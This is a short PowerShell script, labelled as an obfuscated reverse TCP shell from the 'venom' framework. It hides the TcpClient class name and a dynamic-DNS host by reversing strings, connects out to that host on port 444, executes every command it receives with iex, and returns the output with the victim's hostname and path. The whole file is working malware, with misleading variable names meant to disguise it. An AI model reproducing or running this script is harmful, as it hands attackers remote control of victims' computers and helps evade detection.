<#
Obfuscated (rev) Reverse TCP powershell Shell
Framework: venom v1.0.17 (shinigami)
#>

$MyVault = "tneilCpcT.stekcoS.teN";$CertificatePem = $MyVault.ToCharArray();
[Array]::Reverse($CertificatePem);$CmdLine = ($CertificatePem -Join '');
$Cofre = "moc.eerfsndd.semagenilno";$MyChave = $Cofre.ToCharArray();
[Array]::Reverse($MyChave);$RSAx504 = ($MyChave -Join '');
Start-Sleep -Milliseconds 150

$TORproxy = New-Object System.$CmdLine($RSAx504, 444);
$DataRaw = $TORproxy.GetStream();
[byte[]]$bytes = 0..65535|%{0};

while(($iO = $DataRaw.Read($bytes, 0, $bytes.Length)) -ne 0){
   $FTPdata = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $iO);
   $sendTO = (iex $FTPdata 2>&1 | Out-String);
   $TCPReturn = $sendTO + '[' + (hostname) + '] ' + (pwd).Path + '> ';
   $sendbyte = ([text.encoding]::ASCII).GetBytes($TCPReturn);
   $DataRaw.Write($sendbyte,0,$sendbyte.Length);
   $DataRaw.Flush();
}
$TORproxy.Close();
